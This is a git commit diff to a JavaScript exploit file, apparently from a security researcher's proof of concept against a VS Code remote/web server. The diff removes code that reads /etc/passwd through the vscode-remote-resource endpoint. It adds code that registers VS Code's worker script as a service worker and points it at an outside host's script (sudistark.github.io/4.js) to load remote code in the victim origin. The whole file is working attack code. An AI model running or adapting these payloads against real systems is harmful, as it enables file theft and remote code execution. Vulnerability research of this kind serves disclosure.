97031e4890f41c2cdba3785c4feadbbe19574018
Sudhanshu Rajbhar <31372554+Sudistark@users.noreply.github.com>
2024-10-14 18:50:29 +0530

    Update 3.js

--- 3.js
+++ 3.js
@@ -1,9 +1,27 @@
 console.dir("Shirley: Hey sudi, I love you , here is your XSS in " + origin)
 globalThis.fetch = WorkerGlobalScope.prototype.fetch.bind(globalThis)
 
-async function exploit() {
-    const page_resp = await fetch("/stable-d7a2b4936af1bfd80cb96f2567af68badc2325e3/vscode-remote-resource?path=/etc/passwd&tkn=")
-    const text = await page_resp.text()
-    console.dir(text)
+const r_promise = navigator.serviceWorker.register("/stable-de65bfc9477f61bc22d0b1a23085d1f18bb25202/static/out/vs/base/worker/workerMain.js")
+r_promise.then((registration) => {
+    console.log("Registered worker");
+    console.log(registration)
+    globalThis.r = registration;
+
+    let serviceWorker;
+    if (registration.installing) {
+        serviceWorker = registration.installing;
+    } else if (registration.waiting) {
+        serviceWorker = registration.waiting;
+    } else if (registration.active) {
+        serviceWorker = registration.active;
     }
-exploit()
+
+    serviceWorker.postMessage("//sudistark.github.io/4.js");
+    setTimeout(()=>{
+        navigator.serviceWorker.getRegistrations().then(registrations => {
+    for (const registration of registrations) {
+        registration.unregister();
+    } 
+});
+    },10000)
+})
